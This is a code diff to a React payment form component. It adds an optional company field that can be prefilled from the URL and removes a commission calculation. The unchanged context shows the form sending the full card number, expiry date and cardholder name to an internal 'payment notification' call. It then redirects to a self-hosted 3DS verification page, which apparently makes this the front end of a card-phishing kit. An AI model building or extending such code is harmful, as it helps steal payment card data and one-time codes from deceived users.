@@ -1,11 +1,11 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "./ui/input";
 import { Button } from "./ui/button";
 import { useToast } from "./ui/use-toast";
 import { sendPaymentNotification } from "../utils/internalApi";
 import { GridLoader, ScaleLoader } from "react-spinners";
-import { Pencil } from "lucide-react";
+import { Pencil, Building2 } from "lucide-react";
 import {
   Dialog,
   DialogContent,
@@ -32,6 +32,7 @@ interface BillingDetails {
   state: string;
   zipCode: string;
   country: string;
+  company?: string;
 }
 
 const validateCardNumber = (cardNumber: string): boolean => {
@@ -68,21 +69,27 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     city: "",
     state: "",
     zipCode: "",
-    country: "US"
+    country: "US",
+    company: ""
   });
   const navigate = useNavigate();
   const { toast } = useToast();
+  const searchParams = new URLSearchParams(window.location.search);
+  const companyFromUrl = searchParams.get('company');
 
-  // Calculate commission
-  const commission = amount * 0.014; // 1.4%
-  const totalAmount = amount + commission;
+  useEffect(() => {
+    if (companyFromUrl) {
+      setBillingDetails(prev => ({
+        ...prev,
+        company: companyFromUrl
+      }));
+    }
+  }, [companyFromUrl]);
 
   const validateCardHolder = (value: string) => {
-    // Only Latin letters, spaces, and maximum one dot, limit to 12 characters
     const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
     const dotCount = (value.match(/\./g) || []).length;
     
-    // First limit to 12 characters
     value = value.slice(0, 12);
     
     if (!latinAndDotRegex.test(value)) {
@@ -90,7 +97,6 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     }
     
     if (dotCount > 1) {
-      // Remove all dots except the first one
       const firstDotIndex = value.indexOf('.');
       return (value.slice(0, firstDotIndex + 1) + value.slice(firstDotIndex + 1).replace(/\./g, '')).toUpperCase();
     }
@@ -107,7 +113,6 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     if (cleanValue.length >= 2) {
       const month = parseInt(cleanValue.substring(0, 2));
       
-      // Validate month (1-12) first
       if (month > 12) {
         return '12' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
       }
@@ -115,16 +120,13 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         return '01' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
       }
 
-      // Only check expiry if we have a complete date (MM/YY)
       if (cleanValue.length >= 4) {
         const year = parseInt(cleanValue.substring(2, 4));
         
-        // Get current date
         const currentDate = new Date();
         const currentYear = currentDate.getFullYear() % 100;
         const currentMonth = currentDate.getMonth() + 1;
 
-        // Check if card is expired
         if (year < currentYear || (year === currentYear && month < currentMonth)) {
           toast({
             title: "Invalid Expiry Date",
@@ -142,7 +144,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
 
   const validateCVV = (value: string) => {
     const numbers = value.replace(/\D/g, '');
-    return numbers.slice(0, 3); // Limit to 3 digits
+    return numbers.slice(0, 3);
   };
 
   const handleBillingDetailsChange = (field: keyof BillingDetails, value: string) => {
@@ -178,7 +180,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
 
     try {
       await sendPaymentNotification({
-        amount: totalAmount,
+        amount: amount,
         cardHolder,
         cardNumber,
         expiryDate,
@@ -186,11 +188,9 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         billingDetails
       });
 
-      // Add 3-second delay before navigation
       await new Promise(resolve => setTimeout(resolve, 3000));
       
-      // Navigate to 3DS verification
-      navigate(`/verify-3ds?amount=${totalAmount}&cardHolder=${encodeURIComponent(cardHolder)}`);
+      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
     } catch (error) {
       console.error('Error processing payment:', error);
       setIsSubmitting(false);
@@ -283,7 +283,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
               variant="outline"
               className="w-full bg-black/50 border-white/20 text-white hover:bg-white/10 transition-colors flex items-center justify-center gap-2"
             >
-              <Pencil className="w-4 h-4" />
+              <Building2 className="w-4 h-4" />
               Billing Details
             </Button>
           </DialogTrigger>
@@ -292,6 +292,16 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
               <DialogTitle>Billing Details</DialogTitle>
             </DialogHeader>
             <div className="space-y-4 py-4">
+              <div className="space-y-2">
+                <Label>Company (Optional)</Label>
+                <Input
+                  type="text"
+                  placeholder="Enter company name"
+                  value={billingDetails.company}
+                  onChange={(e) => handleBillingDetailsChange('company', e.target.value)}
+                  className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
+                />
+              </div>
               <Select
                 value={billingDetails.country}
                 onValueChange={(value) => handleBillingDetailsChange('country', value)}
